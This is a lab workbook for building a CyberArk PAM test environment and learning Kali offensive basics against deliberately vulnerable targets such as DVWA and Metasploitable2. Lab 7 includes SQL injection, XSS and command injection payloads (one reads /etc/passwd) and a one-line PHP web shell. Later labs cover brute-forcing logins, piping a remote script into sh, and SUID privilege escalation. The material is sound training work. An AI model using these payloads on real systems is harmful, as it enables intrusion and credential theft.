# Hands-On Labs: Phase 1 — PAM Stack + Offensive Security Foundation

Step-by-step lab exercises for Months 1-6, covering the full CyberArk PAM stack build and Kali Linux offensive security fundamentals.

---

## Prerequisites

- Host machine: 16 GB RAM minimum (32 GB recommended), 250 GB free disk space
- Hypervisor: VirtualBox 7.x or VMware Workstation Pro / Player (free)
- Download links:
  - Windows Server 2022 Evaluation (180-day): https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2022
  - Kali Linux 2026.x ISO: https://www.kali.org/get-kali/
  - CyberArk trial media: request from CyberArk Campus at https://www.cyberark.com/cyberark-campus/
- All lab VMs run on an isolated NAT or host-only network — no internet exposure

---

## Lab 1: Lab Network Architecture

**Month 1, Week 1**

### Target Lab Topology

| VM | OS | RAM | Disk | Static IP |
|----|-----|-----|------|-----------|
| VAULT01 | Windows Server 2022 | 4 GB | 60 GB | 192.168.100.10 |
| CPM01 | Windows Server 2022 | 4 GB | 40 GB | 192.168.100.20 |
| PVWA01 | Windows Server 2022 | 4 GB | 40 GB | 192.168.100.30 |
| PSM01 | Windows Server 2022 | 4 GB | 40 GB | 192.168.100.40 |
| DC01 | Windows Server 2022 | 4 GB | 40 GB | 192.168.100.5 (add Month 2) |
| kali | Kali Linux 2026.x | 4 GB | 80 GB | 192.168.100.100 |
| target01 (optional) | Ubuntu (Metasploitable2 or DVWA) | 1 GB | 20 GB | 192.168.100.50 |

All VMs share the same isolated /24 network (192.168.100.0/24). Kali acts as the attack host on the same segment.

### Create the VirtualBox Host-Only Network

```bash
VBoxManage hostonlyif create
VBoxManage hostonlyif ipconfig vboxnet0 --ip 192.168.100.1 --netmask 255.255.255.0
```

### Set Static IPs on Windows VMs (PowerShell)

Run the following on each Windows VM, substituting the correct IP address for each server:

```powershell
New-NetIPAddress -InterfaceAlias "Ethernet" -IPAddress 192.168.100.10 -PrefixLength 24 -DefaultGateway 192.168.100.1
Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses 192.168.100.5
```

Rename each computer to match the topology before rebooting:

```powershell
Rename-Computer -NewName "VAULT01" -Restart
```

---

## Lab 2: CyberArk Vault Installation

**Month 1, Week 2**

Assume CyberArk media has been extracted to `C:\CyberArk\Vault` on VAULT01.

### Pre-Installation Checklist

- Disable Windows Firewall temporarily (re-enable after install with correct rules)
- Confirm static IP is set and hostname is VAULT01
- Ensure at least 40 GB free on the system drive

```powershell
# Confirm static IP
Get-NetIPAddress -InterfaceAlias "Ethernet"

# Confirm hostname
hostname

# Temporarily disable Windows Firewall
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

### Run the Vault Installer

Launch `setup.exe` from `C:\CyberArk\Vault\` as a local administrator. Follow the wizard:

1. Accept the license agreement.
2. Set the Vault installation path (default: `C:\Program Files (x86)\PrivateArk\`).
3. Enter the Vault administrator password — store this in a safe location.
4. Accept default port 1858 unless it conflicts.
5. Complete the installation and allow the first boot to finish.

### Post-Install Verification

```powershell
# Confirm Vault service is running
Get-Service -Name "CyberArk Vault" | Select-Object Status

# Confirm Vault is listening on port 1858
Test-NetConnection -ComputerName localhost -Port 1858

# Check recent Vault events in the Application log
Get-EventLog -LogName Application -Source "CyberArk*" -Newest 10
```

### CredFile Creation

Use the `CreateCredFile.exe` utility (found in Vault media tools) to generate CredFiles for CPM and PVWA service accounts. These are required for each component to authenticate to the Vault at startup.

### Vault Hardening Checklist

- Disable unnecessary Windows services (Print Spooler, Remote Registry, Bluetooth support)
- Enable audit logging (Object Access, Logon/Logoff, Policy Change) via Group Policy or Local Security Policy
- Configure a backup schedule to a separate volume or network share
- Re-enable Windows Firewall and add an inbound rule for TCP 1858 from CPM01 and PVWA01 only

---

## Lab 3: CPM Installation and First Account Onboarding

**Month 1, Week 3**

### CPM Prerequisites

- VAULT01 must be running and reachable on TCP 1858
- A CredFile for the CPM service account must exist (generated during Vault setup)
- The CPM service account (e.g., `PasswordManager`) must be defined in the Vault

### Test Connectivity Before Installation

```powershell
Test-NetConnection -ComputerName 192.168.100.10 -Port 1858
```

### Run the CPM Installer

Extract CyberArk CPM media to `C:\CyberArk\CPM\` on CPM01. Launch `setup.exe` as local administrator. When prompted, supply the Vault address (192.168.100.10) and the path to the CPM CredFile.

### Post-Install Verification

```powershell
# Confirm CPM service is running and set to automatic
Get-Service -Name "CyberArk Password Manager" | Select-Object Status, StartType

# Tail CPM logs to verify it connected to Vault
Get-Content "C:\Program Files (x86)\CyberArk\Password Manager\Logs\pm.log" -Tail 20
```

### First Platform Onboarding — Windows Local Accounts

1. Log in to the PVWA (https://192.168.100.30/PasswordVault/).
2. Navigate to Administration → Platform Management.
3. Duplicate the built-in `WinLocalAccounts` platform and name it `LabWinLocal`.
4. Set the following intervals:
   - Verification: every 1 day
   - Change: every 30 days
   - Reconcile: on failure
5. Save the platform.

### Onboard the First Test Account

- Target: the local Administrator account on CPM01 (192.168.100.20)
- Safe: create a new safe named `LAB-Windows-Local`
- Add CPM01 as the "address" and confirm CPM can verify the password

---

## Lab 4: PVWA Installation and IIS Configuration

**Month 1, Week 4**

### Install IIS and ASP.NET Prerequisites

```powershell
Install-WindowsFeature -Name Web-Server, Web-Asp-Net45, Web-Windows-Auth -IncludeManagementTools
```

Verify IIS is running before proceeding:

```powershell
Get-Service -Name W3SVC | Select-Object Status
```

### Run the PVWA Installer

Extract PVWA media to `C:\CyberArk\PVWA\` on PVWA01. Launch `setup.exe` as local administrator. Supply the Vault address and the PVWA CredFile path when prompted. The installer configures IIS automatically.

### Post-Install Configuration

After installation, open `C:\CyberArk\Password Vault Web Access\` and verify `web.config` contains the correct Vault IP address. Restart the IIS application pool if you change this file:

```powershell
Restart-WebAppPool -Name "PVWA"
```

### Authentication Methods

The PVWA supports three authentication methods configured in the Vault:

- `CyberArk` — native Vault credentials (default for lab)
- `LDAP` — Active Directory (configure after DC01 is joined in Month 2)
- `RADIUS` — for MFA integrations (configure in Month 3)

### Post-Install Validation from Kali

```bash
# Confirm PVWA web interface responds
curl -k -I https://192.168.100.30/PasswordVault/

# Port and service scan on PVWA
nmap -sV -p 443 192.168.100.30
```

---

## Lab 5: PSM Installation and Session Recording

**Month 2, Weeks 5-6**

### PSM Prerequisites

- VAULT01 must be running; TCP 1858 must be reachable from PSM01
- A PSM CredFile and PSM service account must exist in the Vault
- RDP (TCP 3389) must be open inbound on PSM01

### Run the PSM Installer

Extract PSM media to `C:\CyberArk\PSM\` on PSM01. Launch `setup.exe` and supply the Vault address and CredFile. The installer configures the RDS role and PSM connectors automatically.

### Post-Install Verification

```powershell
# Confirm PSM service is running
Get-Service -Name "CyberArk Privileged Session Manager" | Select-Object Status

# Confirm RDP listener is active
Test-NetConnection -ComputerName localhost -Port 3389
```

### Session Recording Safe Configuration

1. Log in to PVWA as an administrator.
2. Navigate to Administration → System Configuration → Options.
3. Under PSM, confirm the recording safe is set to `PSMRecordings`.
4. In PrivateArk Client, open the `PSMRecordings` safe and verify it exists.

### Universal Connector Basics

The PSM ships with connectors for RDP and SSH out of the box. To connect through PSM to a target:

1. Open PVWA and find a managed account.
2. Click Connect → choose the PSM01 connector.
3. PVWA launches a brokered RDP session via PSM01 to the target.

### Review a Recorded Session

1. In PVWA, navigate to Monitoring → Recordings.
2. Locate the session just recorded.
3. Click Play to open the session in the built-in viewer.
4. Note the timeline, keystrokes, and commands captured.

---

## Lab 6: Kali Linux Setup and Tooling Baseline

**Month 1-2 (parallel with PAM labs)**

### System Update and Tool Installation

```bash
# Initial Kali update
sudo apt update && sudo apt full-upgrade -y

# Install additional tools
sudo apt install -y seclists gobuster feroxbuster crackmapexec bloodhound neo4j \
    impacket-scripts netexec evil-winrm chisel proxychains4 \
    responder enum4linux-ng ldap-utils

# Verify Metasploit
msfconsole --version

# Initialize Metasploit database
sudo msfdb init
msfconsole -q -x "db_status; exit"

# Verify Burp Suite Community
burpsuite &

# Create lab working directory structure
mkdir -p ~/lab/{scans,loot,exploits,reports}
```

### Nmap Baseline Scans Against the PAM Lab Network

```bash
# Host discovery
nmap -sn 192.168.100.0/24 -oA ~/lab/scans/host_discovery

# Full service scan on the Vault server
nmap -sV -sC --open -p- --min-rate 2000 192.168.100.10 -oA ~/lab/scans/vault_full

# UDP top ports on the Vault server
sudo nmap -sU --top-ports 100 192.168.100.10 -oA ~/lab/scans/vault_udp
```

Repeat the service and UDP scans for 192.168.100.20 (CPM01), .30 (PVWA01), and .40 (PSM01). Save all output in `~/lab/scans/` using consistent naming (`cpm_full`, `pvwa_full`, `psm_full`).

---

## Lab 7: DVWA Setup and OWASP Top 10 Labs

**Month 3**

### Install DVWA

```bash
# Run DVWA via Docker (simplest method on Kali)
docker run -d -p 8080:80 vulnerables/web-dvwa

# Or install via apt
sudo apt install dvwa
sudo dvwa-start

# Verify DVWA is responding
curl -s http://localhost:8080 | grep -i dvwa
```

Log in with default credentials (`admin` / `password`), navigate to DVWA Security, and set the level to **Low** for initial exercises.

### OWASP Top 10 Exercise Structure

Work through each vulnerability with DVWA Security set to Low first, then repeat at Medium.

#### 1. SQL Injection

Test manually in the input field:

```text
' OR '1'='1
```

Then automate with sqlmap:

```bash
sqlmap -u "http://localhost:8080/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
    --cookie="PHPSESSID=<your_session>;security=low" --dbs --batch
```

#### 2. XSS Reflected

In the XSS (Reflected) module, enter:

```text
<script>alert('xss')</script>
```

Observe the script executing in the browser response.

#### 3. Command Injection

In the Command Injection module, append shell commands to the ping input:

```text
; id
| whoami
&& cat /etc/passwd
```

#### 4. File Upload

Upload a simple PHP web shell as a `.php` file:

```text
<?php system($_GET['cmd']); ?>
```

Navigate to the uploaded file path and trigger it with `?cmd=id`.

#### 5. CSRF

Review the DVWA CSRF module. Craft an HTML form that submits a password-change request without user interaction. Observe that the DVWA application accepts the forged request when the victim is already authenticated.

---

## Lab 8: Burp Suite Proxy Configuration

**Month 3**

### Configure the Browser Proxy

```bash
# Configure Firefox in Kali to use Burp proxy:
# Firefox → Settings → Network Settings → Manual proxy configuration
# HTTP Proxy: 127.0.0.1   Port: 8080
# Check "Also use this proxy for HTTPS"

# Recommended: install FoxyProxy Standard extension for easy toggling
# https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/

# Import the Burp CA certificate to avoid TLS warnings
curl http://burp/cert -o burp_ca.der
# Firefox → Settings → Privacy & Security → Certificates → Import → select burp_ca.der
```

### Exercise 1: Intercept a Login Request

1. Enable the Burp proxy in FoxyProxy.
2. Navigate to the DVWA login page (http://localhost:8080/dvwa/login.php).
3. Enter any credentials and click Login.
4. In Burp Proxy → Intercept, observe the captured POST request with `username` and `password` parameters.
5. Modify the `username` parameter value and forward the request. Observe the changed behavior.

### Exercise 2: Manual SQL Injection with Repeater

1. Capture a request to the DVWA SQL Injection page.
2. Send it to Repeater (Ctrl+R).
3. Modify the `id` parameter with payloads such as `1'`, `1 OR 1=1--`, and `1 UNION SELECT null,null--`.
4. Observe server responses for each payload without needing to re-browse.

### Exercise 3: Login Brute-Force with Intruder

1. Capture the DVWA login POST request.
2. Send to Intruder (Ctrl+I).
3. Set attack type to **Sniper**.
4. Mark the `password` parameter value as the payload position.
5. Load a short wordlist from `/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt`.
6. Start the attack and filter by response length to identify the successful password.

---

## Lab 9: Linux Privilege Escalation Basics

**Month 4**

### Set Up a Vulnerable Linux Target

Deploy Metasploitable2 as a VM on the lab network at 192.168.100.50. Alternatively, use any intentionally vulnerable Linux VM.

### Enumerate the Target from Kali

```bash
# Initial service scan
nmap -sV -sC 192.168.100.50 -oA ~/lab/scans/metasploitable

# Find SUID binaries on a Linux host (run from a shell on the target)
find /usr/bin /usr/sbin /bin /sbin -perm -4000 2>/dev/null

# Check sudo permissions
sudo -l

# Review cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# Check for writable directories in PATH
echo $PATH | tr ':' '\n' | xargs -I{} ls -ld {}

# Run linpeas for automated enumeration
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

### GTFOBins Reference

For every SUID binary found, look it up at https://gtfobins.github.io to check whether it can be exploited for privilege escalation. Document each finding with:

- Binary name
- SUID present (yes/no)
- GTFOBins entry URL
- Exploitation method (if applicable)

---

## Lab 10: DevSecOps Security Pipeline

**Month 5**

### Install Security Scanning Tools

```bash
# Install Semgrep
pip3 install semgrep
semgrep --version

# Install gitleaks
wget https://github.com/gitleaks/gitleaks/releases/latest/download/gitleaks_linux_x64.tar.gz
tar xzf gitleaks_linux_x64.tar.gz -C /usr/local/bin/

# Install Trivy
wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | sudo apt-key add -
echo "deb https://aquasecurity.github.io/trivy-repo/deb $(lsb_release -sc) main" | sudo tee /etc/apt/sources.list.d/trivy.list
sudo apt update && sudo apt install trivy -y
```

### Run Tools Manually Against a Sample Repository

```bash
# SAST scan with Semgrep
semgrep --config=auto /path/to/your/repo --error

# Secret scan with gitleaks
gitleaks detect --source /path/to/your/repo --verbose

# Container image scan with Trivy
trivy image ubuntu:22.04
```

### GitHub Actions Workflow Example

Create `.github/workflows/security.yml` in any portfolio project repository:

```yaml
name: Security Scan
on: [push, pull_request]
jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Semgrep SAST
        run: |
          pip install semgrep
          semgrep --config=auto . --error
      - name: Gitleaks secret scan
        uses: gitleaks/gitleaks-action@v2
      - name: Trivy container scan
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: 'your-image:latest'
          format: 'table'
          exit-code: '1'
          severity: 'CRITICAL,HIGH'
```

Push a commit to the repository and verify all three jobs appear in the Actions tab. Review the output for any findings.

---

## Troubleshooting

### Vault Service Will Not Start

- Verify the CredFile path in `Vault.ini` is correct and the file is readable by the service account
- Check that no other process is using TCP 1858 (`netstat -ano | findstr 1858`)
- Confirm Windows Server time is synchronized (Kerberos is time-sensitive)
- Review the Application event log for `CyberArk` source entries

### CPM Cannot Connect to Vault

```powershell
# Verify TCP 1858 is reachable from CPM01
Test-NetConnection -ComputerName 192.168.100.10 -Port 1858

# Re-verify CredFile path in CPM configuration
Get-Content "C:\Program Files (x86)\CyberArk\Password Manager\Vault\Vault.ini"
```

### PVWA Shows a White Screen or 500 Error

- Check the IIS application pool identity has read access to the PVWA directory
- Open `web.config` and confirm the Vault address is set to 192.168.100.10
- Restart the PVWA application pool: `Restart-WebAppPool -Name "PVWA"`
- Review `C:\CyberArk\Password Vault Web Access\Logs\` for error details

### PSM Session Fails to Launch

- Confirm RDP (TCP 3389) is open on the PSM01 firewall
- Verify the target machine's RDP port is reachable from PSM01
- Check PSM connector logs at `C:\Program Files (x86)\CyberArk\PSM\Logs\`
- Confirm the PSM service account has the required Vault permissions

### Kali Tool Not Found

```bash
# Check if tool is installed
which <tool-name>

# Re-install the tool
sudo apt install <tool-name>

# If installed but not in PATH, locate the binary
sudo find /usr -name "<tool-name>" 2>/dev/null
```

---

**Last Updated**: 2026-04-14
**Version**: 2.0
